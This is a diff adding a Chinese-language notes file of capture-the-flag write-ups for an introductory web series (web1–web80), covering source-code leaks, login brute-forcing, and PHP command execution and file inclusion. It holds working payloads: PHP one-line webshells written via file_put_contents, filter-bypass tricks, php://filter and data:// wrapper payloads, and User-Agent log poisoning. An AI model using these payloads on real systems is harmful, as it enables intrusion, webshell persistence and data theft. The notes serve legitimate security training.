@@ -1,0 +1,115 @@
+本文本文档将记录所有ctf web入门系列的wp
+web1 f12看源码
+web2 f12不让看了，直接burp抓返回包，在html源码里
+web3 burp抓返回包，在http头里
+web4 /robots.txt 里面有flag路径
+web5 源码泄露，访问index.phps可下载源码 
+web6 源码泄露，这个需要用dirsearch扫，扫到www.zip，发现里面的fl000g.txt文件，浏览器访问该页得到
+
+web7 源码泄露 .git源码泄露：采用git管理项目时，上传项目忘记删除.git文件，
+攻击者可通过该文件恢复源码历史版本，从而造成源码泄露 dirsearch扫描出.git目录存在，访问得到flag
+
+web8 源码泄露  SVN和版本控制系统经常作为 漏洞和信息泄露的来源 ，类似于 Git，通过对 SVN 版本控制
+系统的配置不当或目录泄露，攻击者可以访问到项目的源代码、历史记录、敏感信息甚至是 flag，
+直接利用dirsearch进行扫描出.svn目录存在，访问得到flag
+
+web9 swp缓存泄露，在生产环境使用vim编辑文件时，会生成一个源文件名+.swp的缓存文件，访问index.php.swp
+即可下载该文件，打开得到flag
+
+web10 flag在返回包的set cookie里面
+web11 本题考查的是dns使用记录，flag已经送出来了
+web12 打开是一个购物软件的模板，访问/admin界面发现需要登录，网页最底端的电话就是密码，登录成功拿到flag
+web13 敏感信息泄露，在网站底部的技术文档里面出现了泄露内容，泄露了后台登录地址用户名和密码，登录进去得到flag
+web14 网站源码里泄露了编辑器路径，借助图片上传里的文件空间功能，找到了flag所在的地址
+web15 /admin存在后台登录界面，不知道密码。但是可通过密保问题重置密码，问题是我在哪个城市，通过邮箱泄露的qq号地址
+得知是西安，成功重置密码，登陆成功得到flag
+
+web16 根据提示，打开路径/tz.php，通过传参?cat=phpinfo在环境变量里找到flag
+web17 dirsearch扫描到目录backup.sql，通过对应软件打开文件，flag在代码里面
+web18 一个小游戏，html源码泄露了js文件路径，查看源代码发现游戏胜利的提示 你赢了，去尕尕零点皮爱吃皮看看
+/110.php flag在里面
+web19 一个登录框，用户名和密码都在html源码的注释里，密码是前端加密，在burp抓发送包里改密码得到flag
+web20 dirsearch扫到/db目录，接着递归扫描扫到/db/db.mdb文件，flag就在里面
+
+web21 开始考爆破了，通过burp抓包知道登录验证的提交通过get方式，提交格式为admin:password
+在burp的爆破器里添加前缀admin:构造payload，然后用base64编码，取消url编码，爆它就完了
+web22 考察子域名爆破，由于不可控因素直接在题目里给出了flag、
+web23 给了后端代码，通过get传递参数token，需要满足hash加密值的特殊条件，直接用1-1000000传参爆就完了
+得到token=422时，flag出现
+web24 仍然是给源码，考察mt_srand(372619038);这是一个伪随机数生成函数，生成的第1个数确定，在线运行就能得到可传递的参数
+web25 
+
+web26 是一个安装程序，输入数据提交之后在burp的返回包里有flag，连接失败也有
+web27 是一个学生登录系统，里面泄露了学生名字和屏蔽了出生日期的身份证号码，那我们直接爆日期就可以
+通过里面的查询系统得到第一个人的出生日期是19900201，查询成功后得到学号和密码，登陆成功得到flag
+web28 目录爆破，大海捞针，初始访问在/0/1/2.txt，把2.txt改成index.php，然后用1-100爆前两级目录
+得到正确路径在/72/20/index.php，访问得到flag
+
+web29进入命令执行篇，给了源代码，通过参数c传递指令，过滤了字段flag，直接?c=file_put_contents('shell.php','<?php @eval($_POST[cmd]); ?>');
+写入一字马，蚁剑接入读取文件get flag
+web30 新增过滤system，php 重构?c=file_put_contents('shell.'.'ph'.'p','<?= @eval($_POST[1]); ?>');绕过检查
+写入一字马，蚁剑接入读取文件get flag
+web31,过滤了关键的空格，点,单引号，不过你过滤c管我a什么事?c=eval($_GET[a]);&a=file_put_contents('shell.'.'ph'.'p','<?= @eval($_POST[1]); ?>');
+写入shell成功，get flag
+web32添加过滤分号，echo和（,我不行了，看大佬的?c=include$_GET["1"]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
+
+把flag包以base64编码的形式返回
+web33添加过滤双引号，把上个payload里的双引号删掉就好 include算是文件包含漏洞了
+web34添加过滤<依然文件包含，同web33
+web35添加过滤=依然文件包含，同web33
+web36添加过滤0-9依然文件包含，把1改成a，同web33
+
+web37纯正文件包含?c=data://text/plain,<?php system("tac fla*.php")?>
+web38过滤php，file ?c=data://text/plain,<?=system("tac fla*")?>
+web39还是文件包含，同web37
+
+web40过滤了一大堆，但是发现过滤的括号是中文括号，?c=eval(next(reset(get_defined_vars())));&pay=system("tac flag.php")
+来解释一下get_defined_vars()返回当前脚本中所有已定义的变量，返回一个大数组，含c，pay等变量
+reset()把数组指针移到第一位，即$c,next()移到下一位$pay,eval执行pay储存的命令
+
+web41 羽师傅nb 过滤掉大部分可输入的字符，但是忽视了或运算，用可输入字符的或运算算出命令执行的字符，用了超nb的脚本
+web42 本体会把回显丢进黑洞不让看，想办法给他后面的语句屏蔽了就行，?c=tac flag.php ||前面语句逻辑为真就不会运行了
+web43 同web42，这次过滤了;和cat
+web44 同web42，这次过滤了;和cat和flag，把flag.php改成fla*.php就好
+web45 过滤了空格?c=tac$IFS$fla*||,用$IFS$代替
+web46 过滤了$和*现在用%09代替空格，fla[g]或者fla''g代替fla* ?c=tac%09fla''g.php||
+web47 |more|less|head|sort|tail又加了一堆没啥用的，同46
+web48 |sed|cut|awk|strings|od|curl|又加了，同46 
+web49 |\`|\%禁%跟%09没关系，同46
+web50 把%09过滤了，所以不用了?c=tac<fla''g.php||
+web51把tac ban了?c=ta''c<fla''g.php|| 小问题
+web52?c=ta''c$IFS/fla''g|| flag在根目录下
+web53 ta''c${IFS}fla\g.php
+web54通过复制的方式把flag.php迁移到t.txt里面 ?c=cp${IFS}???g.php${IFS}t.txt
+web55无敌通配符，由于过滤了字母 /bin/base64 flag.php 变成/???/????64 ????.???
+web56,57太偏太难，先跳
+
+web58本体开始使用post提交数据，需要使用hackbar进行提交，php后端禁用了很多未知函数
+需要找到能用的函数，本题c=file_get_contents('flag.php')成功后查看源码即可
+web59file_get_contents被禁用了这里用文件包含c=include($_GET[1]);
+?1=php://filter/convert.base64-encode/resource=flag.php
+web60 同web59
+web61学习了日志包含，nginx服务器的日志文件一般在/var/log/nginx/access.log里面
+在ua头里注入一句话木马，然后通过c进行文件包含，通过一句话木马里的参数进行命令执行
+另外highlight_file()没有禁用，show_source();也没禁用，一定要在指令后加；；；！
+
+web62highlight_file()没有禁用，show_source();也没禁用
+新思路c=include('flag.php');echo $flag;
+
+web63 highlight_file()没有禁用 
+c=include('flag.php');var_dump(get_defined_vars());查看所有定义的变量
+include会把文件内容存放在变量里
+web64 show_source();也没禁用
+web65 highlight_file()没有禁用c=include(’/var/log/nginx/access.log‘);
+web66 使用c=var_dump(scandir('../../../'));查看flag在根目录里
+用文件包含或者highlight_file
+web67 highlight_file('/flag.txt);
+web68 highlight_file没了，但是include依然能用
+web69 include依然能用include('/flag.txt');echo $flag;
+web70 include依然能用
+web71 源代码把输出的字符都替换了，不让后面的代码执行就可以
+include('/flag.txt');echo $flag;exit();
+web72-77难度太高，不适合新手捏
+wen78 php伪协议?file=php://filter/convert.base64-encode/resource=flag.php
+web79 data协议?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKSA/Pg==
+web80 php和data都被ban，用日志包含
